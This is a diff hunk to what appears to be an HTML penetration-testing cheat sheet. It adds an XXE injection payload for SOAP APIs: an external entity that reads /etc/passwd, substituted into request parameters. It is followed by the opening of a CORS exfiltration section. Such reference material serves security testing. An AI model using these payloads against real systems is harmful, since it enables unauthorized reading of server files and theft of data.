@@ -2191,6 +2191,15 @@ Content-Length: 52<br><br>
 </ul>
 </code></pre></div></div>
 
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>### In SOAP API:
+- Inject payload between <b>&lt;?xml></b> and <b>&lt;soapenv:Envelope></b>:
+&lt;?xml version="1.0" encoding="UTF-8"?>
+&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;
+&lt;soapenv:Envelope ...>
+
+- Replace parameters in the SOAP request body by <b>&amp;xxe;</b>
+</code></pre></div></div>
+
 <h3 id="cors">CORS Exploitation</h3>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#Exfil sensitive data: Craft exploit server
 &lt;script&gt;
